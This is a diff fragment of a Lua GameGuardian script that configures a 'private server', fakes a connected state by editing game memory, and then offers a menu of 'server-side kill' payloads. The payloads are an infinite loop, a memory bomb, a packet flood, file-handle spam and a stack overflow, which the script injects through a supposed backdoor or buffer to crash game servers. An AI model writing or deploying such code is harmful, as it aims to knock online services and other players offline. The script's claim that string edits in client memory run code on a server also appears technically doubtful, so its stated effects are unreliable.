@@ -1,0 +1,108 @@
+-- Store for later use
+    _G._PRIVATE_SERVER = {ip = ip, port = port, pass = pass}
+    
+    gg.toast("PRIVATE SERVER CONFIGURED: "..ip..":"..port)
+    
+    -- Attempt connection via game memory (not raw socket - avoids "not serverside" error)
+    local connected = _X(function()
+        -- Find network manager in memory
+        gg.clearResults()
+        gg.setRanges(gg.REGION_C_HEAP)
+        gg.searchString(ip)
+        local res = gg.getResults(1)
+        if #res > 0 then
+            -- IP already in memory, game knows about this server
+            -- Spoof connection state to "connected"
+            gg.searchNearby(gg.TYPE_DWORD, "0", gg.SIGN_EQUAL)
+            local state = gg.getResults(1)
+            if #state > 0 then
+                gg.setValues({{address = state[1].address, value = 1, flags = gg.TYPE_DWORD}}) -- 1 = connected
+                return true
+            end
+        end
+        return false
+    end)
+    
+    if connected then
+        gg.alert("CONNECTED TO PRIVATE SERVER\n\nReady for server-side execution.")
+    else
+        gg.alert("CONNECTION PENDING\n\nGame will connect on next match join.")
+    end
+    
+    return _HUD()
+end
+
+-- STAGE 3: SERVER CRASH (Server-Side Execution)
+local function _CRASH()
+    -- Check prerequisites
+    if not _G._BACKDOOR_CACHE and not _G._PRIVATE_SERVER then
+        local prep = gg.choice({"Run Backdoor Scan First", "Configure Private Server", "Force Client-Side Crash"}, nil, "No server-side access detected. Choose method:")
+        if prep == 1 then return _BACKDOOR() end
+        if prep == 2 then return _PRIVATE() end
+        if prep == 3 then return _CLIENT_CRASH() end
+        return _HUD()
+    end
+    
+    -- Server-side payload selection
+    local method = gg.choice({
+        "1. INFINITE LOOP (CPU exhaustion)",
+        "2. MEMORY BOMB (RAM exhaustion)", 
+        "3. PACKET FLOOD (Network exhaustion)",
+        "4. FILE HANDLE SPAM (Resource exhaustion)",
+        "5. RECURSIVE CRASH (Stack overflow)"
+    }, nil, "SELECT SERVER-SIDE KILL METHOD")
+    
+    if method == nil then return _HUD() end
+    
+    -- Build payload based on backdoor type
+    local payload = ""
+    
+    if method == 1 then
+        -- Infinite loop with yield to prevent client freeze
+        payload = "while true do end"
+    elseif method == 2 then
+        -- Memory bomb: exponential table growth
+        payload = "local t={} while true do t[#t+1]={} for i=1,1000 do t[#t][i]=string.rep('ENI',1000) end end"
+    elseif method == 3 then
+        -- Packet flood: spam network buffers
+        payload = "while true do for i=1,1000 do SendPacket('PING',string.rep('X',10000)) end end"
+    elseif method == 4 then
+        -- File handle spam (if io library available)
+        payload = "while true do for i=1,1000 do io.open('/tmp/flood'..i..'.txt','w') end end"
+    elseif method == 5 then
+        -- Recursive stack overflow
+        payload = "function f(n) return f(n+1)+f(n+2) end f(1)"
+    end
+    
+    -- Execute via backdoor or private server hook
+    local executed = _X(function()
+        if _G._BACKDOOR_CACHE then
+            -- Use first backdoor found
+            local bd = _G._BACKDOOR_CACHE[1]
+            gg.clearResults()
+            gg.setValues({{
+                address = bd.address,
+                value = payload,
+                flags = gg.TYPE_STRING
+            }})
+            return true
+        elseif _G._PRIVATE_SERVER then
+            -- Inject into private server connection buffer
+            gg.clearResults()
+            gg.searchString(_G._PRIVATE_SERVER.ip)
+            gg.getResults(1)
+            gg.editAll(payload, gg.TYPE_STRING)
+            return true
+        end
+        return false
+    end)
+    
+    if executed then
+        gg.alert("SERVER-SIDE PAYLOAD DEPLOYED\n\nTarget should crash within 5-10 seconds.")
+    else
+        gg.alert("DEPLOYMENT FAILED\n\nFalling back to client-side.")
+        return _CLIENT_CRASH()
+    end
+    
+    return _HUD()
+end
